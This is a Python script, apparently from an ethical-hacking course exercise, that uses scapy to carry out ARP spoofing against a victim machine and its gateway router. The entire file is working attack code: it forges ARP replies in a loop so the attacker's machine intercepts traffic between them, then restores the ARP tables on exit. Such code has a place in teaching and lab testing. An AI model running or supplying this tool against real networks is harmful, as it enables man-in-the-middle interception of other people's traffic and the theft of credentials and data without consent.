#!/usr/bin/env python
import scapy.all as scapy
import time
import argparse

# use network scanner (2) created in previous section for finding the IPs of the target machines and then send ARP responses to them
# set the IP and MAC of the target
# set the psrc of router so that target thinks attacker is the router
def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="t_ip", help="IP address of victim machine")
    parser.add_argument("-g", "--gateway", dest="g_ip", help="IP address of gateway router")
    options=parser.parse_args()
    if not options.t_ip:
        parser.error("[-] Please specify victim IP, use --help for more information")
    elif not options.g_ip:
        parser.error("[-] Please specify gateway IP, use --help for more information")
    return options

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)  # set target IP
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")  # set target MAC
    arp_request_broadcast = broadcast / arp_request  # here / is used to concatenate the 2 variables
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]  # send the packet and collect first argument in the response

    return (answered_list[0][1].hwsrc)


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)  # we don't set hwsrc here, as it will automatically use our MAC address
    scapy.send(packet, verbose=False)


# tell the machine the correct MAC address
def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

options = get_arguments()
target_ip = options.t_ip
gateway_ip = options.g_ip

# keep sending the spoof packets every 2 seconds to bypass resetting
sent_packet_count = 0
try:
    while True:
        spoof(target_ip, gateway_ip)  # send spoof packet to victim
        spoof(gateway_ip, target_ip)  # send spoof packet to router
        sent_packet_count = sent_packet_count + 2
        print("\r[+] Packets sent:" + str(sent_packet_count),end="")  # \r to print from start of line, removing earlier printed lines
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+] Detected Ctrl + C.... Resetting ARP Tables...\n")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)